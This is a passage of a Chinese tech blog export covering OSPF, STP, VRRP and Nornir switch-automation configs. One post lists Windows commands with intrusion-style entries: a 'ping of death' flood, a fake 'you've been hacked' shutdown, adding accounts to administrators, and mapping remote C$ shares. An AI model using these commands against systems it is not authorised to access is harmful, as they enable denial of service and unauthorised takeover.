<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei] interface g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] ip address 10.10.10.1 30</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] ip address 11.11.11.1 30</span><br><span class="line">[Huawei] ospf 1 router-id 1.1.1.1</span><br><span class="line">[Huawei-ospf-1] area 0</span><br><span class="line">[Huawei-ospf-1-area-0.0.0.0] network 10.10.10.0 0.0.0.3</span><br><span class="line">[Huawei-ospf-1-area-0.0.0.0] area 1 </span><br><span class="line">[Huawei-ospf-1-area-0.0.0.1] network 11.11.11.0 0.0.0.3</span><br></pre></td></tr></table></figure>

<ul>
<li>R3配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei] interface g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] ip address 11.11.11.2 30</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] ip address 12.12.12.1 30</span><br><span class="line">[Huawei] ospf 1 router-id 2.2.2.2</span><br><span class="line">[Huawei-ospf-1] area 1</span><br><span class="line">[Huawei-ospf-1-area-0.0.0.1] network 11.11.11.0 0.0.0.3</span><br><span class="line">[Huawei-ospf-1-area-0.0.0.1] network 12.12.12.0 0.0.0.3</span><br></pre></td></tr></table></figure>

<ul>
<li>R4配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei] interface g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] ip address 12.12.12.2 30</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] interface g0/0/0</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] ip address 13.13.13.1 30</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] ospf 1 router-id 3.3.3.3</span><br><span class="line">[Huawei-ospf-1] area 0</span><br><span class="line">[Huawei-ospf-1-area-0.0.0.0] network 13.13.13.0 0.0.0.3</span><br><span class="line">[Huawei-ospf-1-area-0.0.0.0] area 1</span><br><span class="line">[Huawei-ospf-1-area-0.0.0.1] network 12.12.12.2 0.0.0.3</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>ospf配置</tag>
      </tags>
  </entry>
  <entry>
    <title>STP生成树简介与配置</title>
    <url>/archives/c3a564d6.html</url>
    <content><![CDATA[<p>stp-spanning tree protocol(生成树协议)：逻辑上断开环路，防止广播风暴的产生，当线路故障，阻塞接口被激活，恢复通信，起备份线路作用。</p>
<span id="more"></span>

<h2 id="生成树算法分为3个步骤："><a href="#生成树算法分为3个步骤：" class="headerlink" title="生成树算法分为3个步骤："></a>生成树算法分为3个步骤：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每个广播域选择根网桥（root bridge）</span><br><span class="line">每个非根网桥选择根端口（root port）</span><br><span class="line">每个网段上选择指定端口（designated port）</span><br></pre></td></tr></table></figure>

<h2 id="选择根网桥"><a href="#选择根网桥" class="headerlink" title="选择根网桥"></a>选择根网桥</h2><ul>
<li>  网桥ID是唯一的。</li>
<li>  交换机之间选择BID值最小的交换机作为网络中的根网桥。</li>
</ul>
<h2 id="选择根端口"><a href="#选择根端口" class="headerlink" title="选择根端口"></a>选择根端口</h2><ul>
<li>选择根端口的依据：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">到根网桥最低的路径成本</span><br><span class="line">直连的网桥ID最小</span><br><span class="line">端口标识最小</span><br></pre></td></tr></table></figure>

<ul>
<li>路径成本，默认情况下千兆链路成本为20000，百兆链路为200000.</li>
<li>端口标识：端口标识越小越优先，有端口优先级和端口号两部分组成，端口优先级可配置，默认值128.</li>
</ul>
<h2 id="stp的收敛"><a href="#stp的收敛" class="headerlink" title="stp的收敛"></a>stp的收敛</h2><ul>
<li>交换机端口的5种stp状态</li>
</ul>
<table>
<thead>
<tr>
<th>状态</th>
<th align="center">用途</th>
</tr>
</thead>
<tbody><tr>
<td>禁用（disabled）</td>
<td align="center">强制关闭</td>
</tr>
<tr>
<td>阻塞（blocking）</td>
<td align="center">只接收BPDU</td>
</tr>
<tr>
<td>侦听（listening）</td>
<td align="center">构建“活动”拓扑</td>
</tr>
<tr>
<td>学习（learning）</td>
<td align="center">构建网桥表</td>
</tr>
<tr>
<td>转发（forwarding）</td>
<td align="center">发送/接收用户数据</td>
</tr>
</tbody></table>
<h2 id="mstp概述"><a href="#mstp概述" class="headerlink" title="mstp概述"></a>mstp概述</h2><ul>
<li>mstp多进程是基于stp协议的增强性技术。</li>
<li>将二层交换设备4上的端口绑定到不同的进程中，并以进程为单位进行stp协议计算。</li>
<li>不在同一个进程内的端口不参与此进程中mstp协议计算，从而实现各个进程内的生成树计算相互独立，互不影响。</li>
<li>mstp网络中包含一个或多个mst域（mst region），每个mst region中包含一个或多个msti。组成msti的是运行生成树协议的交换设备。</li>
<li>mstp兼容stp，既可以快速收敛，又提供了数据转发的多个冗余路径。</li>
<li>在数据转发过程中实现vlan数据的负载均衡。</li>
</ul>
<h2 id="华为配置stp"><a href="#华为配置stp" class="headerlink" title="华为配置stp"></a>华为配置stp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] stp &#123;enable  disabled&#125; //默认开启</span><br><span class="line">[huawei] stp mode &#123;stp  rstp  mstp&#125; //默认mstp</span><br><span class="line">[huawei] stp ptiority 数值 //取值范围0-61440，步长4096，默认值32768</span><br><span class="line">[huawei] interface g0/0/24</span><br><span class="line">[huawei-g0/0/24] stp cost &#123;value&#125;</span><br><span class="line">[huawei-g0/0/24] stp &#123;enable  disabled&#125; //更改端口的stp cost，在端口上开启或关闭stp功能</span><br></pre></td></tr></table></figure>

<h2 id="华为配置mstp"><a href="#华为配置mstp" class="headerlink" title="华为配置mstp"></a>华为配置mstp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] stp region-configuration //进入生成树协议区域配置</span><br><span class="line">[Huawei-mst-region] region-name  name//区域命名</span><br><span class="line">[Huawei-mst-region] instance 1 vlan 10 //开启生成树实例，并将vlan加入</span><br><span class="line">[Huawei-mst-region] active region-configuration // 激活区域配置</span><br><span class="line">[huawei] stp instance 1 priority 4096 //修改实例的优先级，可实现同一个交换机在不同vlan中的stp身份</span><br><span class="line">[Huawei-mst-region] display this //查看当前实例的生成树信息</span><br><span class="line">[huawei] display stp instance 1 //查看某个实例的生成树信息</span><br></pre></td></tr></table></figure>

<h2 id="思科配置stp"><a href="#思科配置stp" class="headerlink" title="思科配置stp"></a>思科配置stp</h2><p>思科交换机默认开启生成树协议。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch# show spanning-tree //查看stp信息</span><br><span class="line">Switch(config)#spanning-tree vlan 1 root primary // 手动更改根网桥</span><br><span class="line">Switch(config)#interface fastEthernet 0/1</span><br><span class="line">Switch(config-if)#spanning-tree  vlan 1 port-priority 48 //手动更改根端口</span><br></pre></td></tr></table></figure>

<h2 id="思科配置mstp"><a href="#思科配置mstp" class="headerlink" title="思科配置mstp"></a>思科配置mstp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)# spanning-tree mode mstp//模式改为mst，默认所有的vlan在同一个组里</span><br><span class="line">Switch(config)# spanning-tree mstp configuration//进入mstp的配置模式</span><br><span class="line">Switch(config-mst)# name name//给mstp设置一个名字</span><br><span class="line">Switch(config-mst)# revision rev_num//配置mstp的版本号</span><br><span class="line">Switch(config-mst)# instance instance-number vlan range//配置组号和vlan的范围</span><br><span class="line">Switch(config-mst)# spanning-tree mst instance_number root primarysecondary</span><br><span class="line">Switch# show spanning-tree mst configuration//查看mstp的配置信息</span><br><span class="line">Switch# show spanning-tree mst //查看mst信息</span><br><span class="line">Switch(config)# spanning-tree mst 1 priority 《0-614400》将此交换机配置为是instance 1的根桥</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>stp</tag>
      </tags>
  </entry>
  <entry>
    <title>widows下常用的DOS命令</title>
    <url>/archives/e717e14f.html</url>
    <content><![CDATA[<p>偶尔在其他地方看到的Windows的DOS命令，在此记录一下。</p>
<span id="more"></span>

<h2 id="常用DOS命令"><a href="#常用DOS命令" class="headerlink" title="常用DOS命令"></a>常用DOS命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Color 参数：改变cmd颜色</span><br><span class="line"></span><br><span class="line">Ping -t -l 65550 IP 死亡之ping（发送大于64k的文件并一直ping）</span><br><span class="line"></span><br><span class="line">Ipconfig 查看IP</span><br><span class="line"></span><br><span class="line">Ipconfig /release 释放IP (针对于DHCP环境)</span><br><span class="line"></span><br><span class="line">Ipconfig /renew 重新获得IP (针对于DHCP环境)</span><br><span class="line"></span><br><span class="line">Systeminfo 查看系统信息</span><br><span class="line"></span><br><span class="line">Arp -a 查看arp信息</span><br><span class="line"></span><br><span class="line">Net view 查看局域网内其他计算机名称</span><br><span class="line"></span><br><span class="line">Shutdown -s -t 180 -c “你被黑了，系统马上关机”</span><br><span class="line"></span><br><span class="line">Dir 查看目录</span><br><span class="line"></span><br><span class="line">Cd 切换目录</span><br><span class="line"></span><br><span class="line">Start www.baidu.com 打开网页</span><br><span class="line"></span><br><span class="line">Start 123.txt 打开123.txt</span><br><span class="line">    </span><br><span class="line">Copy con c:\\123.txt 创建123.txt文件</span><br><span class="line">    </span><br><span class="line">Type 文件 在命令行查看文件</span><br><span class="line">    </span><br><span class="line">Ctrl+z 回车</span><br><span class="line">    </span><br><span class="line">Md 目录名  创建目录</span><br><span class="line">    </span><br><span class="line">Rd 123 删除文件夹</span><br><span class="line">    </span><br><span class="line">Ren 源文件名 新文件名 重命名文件名</span><br><span class="line">   </span><br><span class="line">Del 删除文件</span><br><span class="line">   </span><br><span class="line">Copy 复制文件</span><br><span class="line">    </span><br><span class="line">Move 移动文件</span><br><span class="line">    </span><br><span class="line">Tree 树形列出文件夹结构</span><br><span class="line">    </span><br><span class="line">Net use k:\\\\192.168.1.1\\c$ 把远程主机的盘符映射到本地</span><br><span class="line">    </span><br><span class="line">Net use k:\\\\192.168.1.1\\c$ /del</span><br><span class="line">    </span><br><span class="line">Net start 查看开启了哪些服务</span><br><span class="line">    </span><br><span class="line">Net start 服务名 开启服务</span><br><span class="line">    </span><br><span class="line">Net stop 服务名 停止服务</span><br><span class="line">    </span><br><span class="line">Net user 用户名 密码 /add 创建用户</span><br><span class="line">    </span><br><span class="line">Net user guest /active:yes 激活guest用户</span><br><span class="line">    </span><br><span class="line">Net user 查看有那些用户</span><br><span class="line">    </span><br><span class="line">Net user 账户名 查看账号的属性</span><br><span class="line">    </span><br><span class="line">Net localgroup administrators 用户名 /add 把用户添加到管理员中使用管理员权限，注意：administrtor后加”s“用复数</span><br><span class="line">    </span><br><span class="line">Net user guest 123456 用guest用户登录后将密码改为123456</span><br><span class="line">    </span><br><span class="line">Net password 密码 更改系统登录密码</span><br><span class="line">    </span><br><span class="line">Net share 查看本地开启的共享</span><br><span class="line">    </span><br><span class="line">Net share ips$ 开启ipc$共享</span><br><span class="line">    </span><br><span class="line">Net share ipc$ /del 删除ipc$共享</span><br><span class="line">    </span><br><span class="line">Net share c$ /del 删除C: 共享</span><br><span class="line">    </span><br><span class="line">Netstat -a 查看开启了哪些端口，常用nestat -an</span><br><span class="line">     </span><br><span class="line">Netstat -n 查看端口的网络连接情况</span><br><span class="line">     </span><br><span class="line">Netstat -v 查看正在进行的工作</span><br><span class="line">     </span><br><span class="line">Netsh 网络工具</span><br><span class="line">     </span><br><span class="line">Attrib 文件名 查看文件目录属性</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全攻防</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>VRRP原理与配置</title>
    <url>/archives/b5ea7c98.html</url>
    <content><![CDATA[<ul>
<li>  vrrp能够在不改变组网的情况下，将多台路由器虚拟成一个虚拟路由器，通过配置虚拟路由器的IP地址为默认网关，实现网关的备份。</li>
<li>  vrrp协议（virtual router redundancy protocol，虚拟路由器冗余协议），由IETF标准RFC2338定义。</li>
<li>  协议版本：VRRPv2仅适用于IPV4网络。VRRPv3适用于IPV4和IPV6两种网络。</li>
<li>  vrrp组成员角色：主（master）路由器，备份（backup）路由器，虚拟（virtual）路由器。</li>
</ul>
<span id="more"></span>
<h2 id="vrrp三种状态"><a href="#vrrp三种状态" class="headerlink" title="vrrp三种状态"></a>vrrp三种状态</h2><ul>
<li>Initialize（初始状态）：所有路由器都从初始状态开始，即进程启动后进入此状态。</li>
<li>Backup（备份状态）：接收主路由器发送的vrrp组播通告，由此判断主路由器的状态；丢弃发送到虚拟路由器的mac地址和IP地址的数据包；不响应对虚拟IP地址的ARP请求。</li>
<li>Master（主状态）：定期发送vrrp组播通告；相应对虚拟IP地址的ARP请求；转发目的地址是虚拟Mac地址的IP数据包。</li>
</ul>
<h2 id="vrrp计时器"><a href="#vrrp计时器" class="headerlink" title="vrrp计时器"></a>vrrp计时器</h2><ul>
<li>vrrp通告的发送时间默认为1s。</li>
<li>master_down_interval时间：即备份路由器一段时间没有收到主路由器的vrrp通告，则认为主路由器异常，自身成为主路由器。</li>
<li>master_down_interval时间是3倍的vrrp通告发送时间再加上一个偏移时间。</li>
</ul>
<h2 id="vrrp端口跟踪"><a href="#vrrp端口跟踪" class="headerlink" title="vrrp端口跟踪"></a>vrrp端口跟踪</h2><ul>
<li>上行端口不可用时，vrrp优先级降低。</li>
<li>主路由器可以根据线路情况自动调整。</li>
</ul>
<h2 id="vrrp认证"><a href="#vrrp认证" class="headerlink" title="vrrp认证"></a>vrrp认证</h2><p>认证方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无认证</span><br><span class="line">简单（明文）认证</span><br><span class="line">MD5（加密）认证</span><br></pre></td></tr></table></figure>

<h2 id="下面是一个简单的实验"><a href="#下面是一个简单的实验" class="headerlink" title="下面是一个简单的实验"></a>下面是一个简单的实验</h2><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092976.png"></p>
<ul>
<li>sw1的配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] vlan 2 </span><br><span class="line">[Huawei-Vlanif2] ip address 192.168.20.1 30</span><br><span class="line">[Huawei-Vlanif1] ip address 192.168.10.1 255.255.255.0</span><br><span class="line">[Huawei-Vlanif1] vrrp vrid 1 virtual-ip 192.168.10.254</span><br><span class="line">[Huawei-Vlanif1] vrrp vrid 1 priority 200</span><br><span class="line">[Huawei-Vlanif1] vrrp vrid 1 preempt-mode timer delay 20</span><br><span class="line">[Huawei-Vlanif1] vrrp vrid 1 track interface GigabitEthernet0/0/2 reduced 100</span><br><span class="line">[Huawei-Vlanif1] interface GigabitEthernet0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] port link-type trunk</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] port trunk allow-pass vlan all</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] interface GigabitEthernet0/0/2</span><br><span class="line">[Huawei-GigabitEthernet0/0/2] port link-type access</span><br><span class="line">[Huawei-GigabitEthernet0/0/2] port default vlan 2</span><br><span class="line">[Huawei-GigabitEthernet0/0/2] ip route-static 0.0.0.0 0.0.0.0 192.168.20.2</span><br></pre></td></tr></table></figure>

<ul>
<li>sw2的配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] vlan 2 </span><br><span class="line">[Huawei-Vlanif2] ip address 192.168.30.1 30</span><br><span class="line">[Huawei-Vlanif1] ip address 192.168.10.253 255.255.255.0</span><br><span class="line">[Huawei-Vlanif1] vrrp vrid 1 virtual-ip 192.168.10.254</span><br><span class="line">[Huawei-Vlanif1] vrrp vrid 1 priority 150</span><br><span class="line">[Huawei-Vlanif1] interface GigabitEthernet0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] port link-type trunk</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] port trunk allow-pass vlan all</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] interface GigabitEthernet0/0/2</span><br><span class="line">[Huawei-GigabitEthernet0/0/2] port link-type access</span><br><span class="line">[Huawei-GigabitEthernet0/0/2] port default vlan 2</span><br><span class="line">[Huawei-GigabitEthernet0/0/2] ip route-static 0.0.0.0 0.0.0.0 192.168.30.2</span><br></pre></td></tr></table></figure>

<ul>
<li>r1的配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] interface GigabitEthernet0/0/0</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] ip address 192.168.20.2 255.255.255.252</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] interface GigabitEthernet0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] ip address 192.168.30.2 255.255.255.252 </span><br><span class="line">[Huawei-GigabitEthernet0/0/1] interface LoopBack0</span><br><span class="line">[Huawei-LoopBack0] ip address 10.10.10.200 255.255.255.0 </span><br><span class="line">[huawei] ip route-static 192.168.10.0 255.255.255.0 192.168.20.1</span><br><span class="line">[huawei] ip route-static 192.168.10.0 255.255.255.0 192.168.30.1 preference 100</span><br></pre></td></tr></table></figure>

<ul>
<li>查看vrrp信息</li>
</ul>
<p>sw1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei]dis vrrp</span><br><span class="line">  Vlanif1  Virtual Router 1</span><br><span class="line">    State : Master</span><br><span class="line">    Virtual IP : 192.168.10.254</span><br><span class="line">    Master IP : 192.168.10.1</span><br><span class="line">    PriorityRun : 200</span><br><span class="line">    PriorityConfig : 200</span><br><span class="line">    MasterPriority : 200</span><br><span class="line">    Preempt : YES   Delay Time : 20 s</span><br><span class="line">    TimerRun : 1 s</span><br><span class="line">    TimerConfig : 1 s</span><br><span class="line">    Auth type : NONE</span><br><span class="line">    Virtual MAC : 0000-5e00-0101</span><br><span class="line">    Check TTL : YES</span><br><span class="line">    Config type : normal-vrrp</span><br><span class="line">    Track IF : GigabitEthernet0/0/2   Priority reduced : 100</span><br><span class="line">    IF state : UP</span><br><span class="line">    Create time : 2019-08-12 11:20:09 UTC-08:00</span><br><span class="line">    Last change time : 2019-08-12 18:33:42 UTC-08:00</span><br></pre></td></tr></table></figure>

<p>sw2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei]dis vrrp</span><br><span class="line">  Vlanif1  Virtual Router 1</span><br><span class="line">    State : Backup</span><br><span class="line">    Virtual IP : 192.168.10.254</span><br><span class="line">    Master IP : 192.168.10.1</span><br><span class="line">    PriorityRun : 150</span><br><span class="line">    PriorityConfig : 150</span><br><span class="line">    MasterPriority : 200</span><br><span class="line">    Preempt : YES   Delay Time : 0 s</span><br><span class="line">    TimerRun : 1 s</span><br><span class="line">    TimerConfig : 1 s</span><br><span class="line">    Auth type : NONE</span><br><span class="line">    Virtual MAC : 0000-5e00-0101</span><br><span class="line">    Check TTL : YES</span><br><span class="line">    Config type : normal-vrrp</span><br><span class="line">    Create time : 2019-08-12 11:30:17 UTC-08:00</span><br><span class="line">    Last change time : 2019-08-12 18:33:43 UTC-08:00</span><br></pre></td></tr></table></figure>

<p>R1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei]dis ip routing-table </span><br><span class="line">Route Flags: R - relay, D - download to fib</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">Routing Tables: Public</span><br><span class="line">         Destinations : 14       Routes : 14</span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">     10.10.10.0/24  Direct  0    0           D   10.10.10.200    LoopBack0</span><br><span class="line">   10.10.10.200/32  Direct  0    0           D   127.0.0.1       LoopBack0</span><br><span class="line">   10.10.10.255/32  Direct  0    0           D   127.0.0.1       LoopBack0</span><br><span class="line">      127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0</span><br><span class="line">      127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0</span><br><span class="line">127.255.255.255/32  Direct  0    0           D   127.0.0.1       InLoopBack0</span><br><span class="line">   192.168.10.0/24  Static  60   0          RD   192.168.20.1    GigabitEthernet</span><br><span class="line">0/0/0</span><br><span class="line">   192.168.20.0/30  Direct  0    0           D   192.168.20.2    GigabitEthernet</span><br><span class="line">0/0/0</span><br><span class="line">   192.168.20.2/32  Direct  0    0           D   127.0.0.1       GigabitEthernet</span><br><span class="line">0/0/0</span><br><span class="line">   192.168.20.3/32  Direct  0    0           D   127.0.0.1       GigabitEthernet</span><br><span class="line">0/0/0</span><br><span class="line">   192.168.30.0/30  Direct  0    0           D   192.168.30.2    GigabitEthernet</span><br><span class="line">0/0/1</span><br><span class="line">   192.168.30.2/32  Direct  0    0           D   127.0.0.1       GigabitEthernet</span><br><span class="line">0/0/1</span><br><span class="line">   192.168.30.3/32  Direct  0    0           D   127.0.0.1       GigabitEthernet</span><br><span class="line">0/0/1</span><br><span class="line">255.255.255.255/32  Direct  0    0           D   127.0.0.1       InLoopBack0</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>VRRP</tag>
      </tags>
  </entry>
  <entry>
    <title>windows10下详细的图文教程开启ftp共享服务</title>
    <url>/archives/dbbf7591.html</url>
    <content><![CDATA[<p>平常用VMware做一些Linux平台的实验，在windows和Linux平台之间的文件传输，一直是有点头疼的事，也用过winscp这款软件，不过传输速度的话还是感觉没有ftp快。下面介绍win10平台下开启ftp服务。</p>
<span id="more"></span>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092915.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092914.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092913.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092912.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092911.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/201909299.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/201909298.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/201909297.png"> </p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows - win10开ftp服务</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Nornir3自动化备份交换机配置</title>
    <url>/archives/4cf87063.html</url>
    <content><![CDATA[<p>本篇整理一下使用Nornir3自动化备份交换机配置的相关内容。不过经测试对于一些比较老的华三、华为交换机目前没能实现备份。</p>
<span id="more"></span>

<h1 id="default-yaml"><a href="#default-yaml" class="headerlink" title="default.yaml"></a>default.yaml</h1><p>此文件可以放一些默认参数，当nornir在hosts.yaml文件中找不到的参数时，默认会读取该文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: root</span><br><span class="line">password: password123</span><br><span class="line">port: 22</span><br><span class="line">platform: hp_comware</span><br></pre></td></tr></table></figure>

<h1 id="hosts-yaml"><a href="#hosts-yaml" class="headerlink" title="hosts.yaml"></a>hosts.yaml</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sw1:</span><br><span class="line">  hostname: 192.168.0.1</span><br><span class="line">  username: root</span><br><span class="line">  password: &#x27;qwer1234&#x27;</span><br><span class="line">  port: 22</span><br><span class="line">  platform: huawei</span><br><span class="line">  groups:</span><br><span class="line">    - huawei</span><br><span class="line">sw2:</span><br><span class="line">  hostname: 192.168.1.1</span><br><span class="line">  port: 23</span><br><span class="line">  platform: hp_comware_telnet</span><br><span class="line">  groups:</span><br><span class="line">    - h3c</span><br><span class="line">sw3:</span><br><span class="line">  hostname: 192.168.2.1</span><br><span class="line">  username: root</span><br><span class="line">  password: &#x27;root&#x27;</span><br><span class="line">  port: 23</span><br><span class="line">  platform: cisco_ios_telnet</span><br><span class="line">  groups:</span><br><span class="line">    - cisco</span><br></pre></td></tr></table></figure>
<p>平台加_telnet为telnet连接方式。</p>
<h1 id="groups-yaml"><a href="#groups-yaml" class="headerlink" title="groups.yaml"></a>groups.yaml</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">h3c:</span><br><span class="line">  data:</span><br><span class="line">    backup_configs:</span><br><span class="line">      - display current-configure</span><br><span class="line">huawei:</span><br><span class="line">  data:</span><br><span class="line">    backup_configs:</span><br><span class="line">      - display current-configure      </span><br><span class="line">cisco:</span><br><span class="line">  data:</span><br><span class="line">    backup_configs:</span><br><span class="line">      - show running-config</span><br></pre></td></tr></table></figure>
<p>此文件一般放一些需要执行的命令相关。</p>
<h1 id="脚本内容"><a href="#脚本内容" class="headerlink" title="脚本内容"></a>脚本内容</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from nornir import InitNornir</span><br><span class="line">from nornir_netmiko import netmiko_send_command</span><br><span class="line">from nornir_utils.plugins.tasks.files import write_file</span><br><span class="line">from nornir_utils.plugins.functions import print_result,print_title</span><br><span class="line">import datetime</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">switch = InitNornir(config_file=&quot;config.yaml&quot;)</span><br><span class="line">def backup(task):</span><br><span class="line">    cmds = task.host.groups[0].data.get(&#x27;backup_configs&#x27;)</span><br><span class="line"></span><br><span class="line">    for cmd in cmds:</span><br><span class="line">            result = task.run(netmiko_send_command,command_string=cmd,max_loops=500)</span><br><span class="line">            print(result)</span><br><span class="line">            output = result.result</span><br><span class="line"></span><br><span class="line">            file_name = datetime.datetime.now().strftime(&#x27;%Y-%m-%d&#x27;)</span><br><span class="line">            if not os.path.exists(file_name):</span><br><span class="line">                os.mkdir(file_name)</span><br><span class="line">            write_result = task.run(write_file,</span><br><span class="line">                                    filename=file_name+&#x27;/&#x27;f&#x27;&#123;task.host.hostname&#125;.txt&#x27;,</span><br><span class="line">                                    content=output,</span><br><span class="line">                                    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print_title(&quot;正在备份交换机配置.....&quot;)</span><br><span class="line">results = switch.run(task=backup)</span><br><span class="line">print_result(results)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>此脚本实现是创建一个日期为名称的文件夹，并读取交换机配置写入以IP地址的txt文本，然后放到当天日期名称的文件夹。</li>
<li>可以结合linux平台、windows平台计划定时任务实现自动化备份配置。</li>
</ul>
]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>Nornir3</tag>
        <tag>python</tag>
        <tag>自动化备份</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Nornir3自动化配置交换机</title>
    <url>/archives/dba96ee5.html</url>
    <content><![CDATA[<p>工作中因为交换机设备老旧，所以时常要更换一些交换机，包括接入层一些配置的调整。逐个配置太繁琐，有时候也会出现错误，因此决定用Nornir进行自动化推送保存配置。</p>
<span id="more"></span>

<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>虽然说是自动化，但是还是需要一些配置是需要手工配置的：</p>
<ul>
<li>可管理的IP地址</li>
<li>远程连接方式：SSH或者Telnet</li>
</ul>
<h2 id="编写配置文件"><a href="#编写配置文件" class="headerlink" title="编写配置文件"></a>编写配置文件</h2><p>还是Nornir默认的几个配置文件，此处以H3C交换机为例。</p>
<ul>
<li><p>config.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">inventory:</span><br><span class="line">  plugin: SimpleInventory</span><br><span class="line">  options:</span><br><span class="line">    host_file: &quot;Inventory/hosts.yaml&quot;</span><br><span class="line">    group_file: &quot;Inventory/groups.yaml&quot;</span><br><span class="line">    defaults_file: &quot;Inventory/defaults.yaml&quot;</span><br><span class="line"></span><br><span class="line">runner:</span><br><span class="line">  plugin: threaded</span><br><span class="line">  options:</span><br><span class="line">    num_workers: 100</span><br></pre></td></tr></table></figure></li>
<li><p>defaults.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">username: root</span><br><span class="line">password: &#x27;password&#x27;</span><br><span class="line">port: &#x27;22&#x27;</span><br><span class="line">platform: hp_comware</span><br></pre></td></tr></table></figure></li>
<li><p>groups.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">h3c:</span><br><span class="line">  data:</span><br><span class="line">    save_config_type: save</span><br><span class="line">    backup_configs:</span><br><span class="line">      - display current-configuration</span><br></pre></td></tr></table></figure></li>
<li><p>hosts.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">sw1:</span><br><span class="line">  hostname: 192.168.8.254</span><br><span class="line">  groups:</span><br><span class="line">    - h3c</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="交换机命令配置文件"><a href="#交换机命令配置文件" class="headerlink" title="交换机命令配置文件"></a>交换机命令配置文件</h2><p>我这里命名为config.txt，名称随意</p>
<ul>
<li><p>config.txt</p>
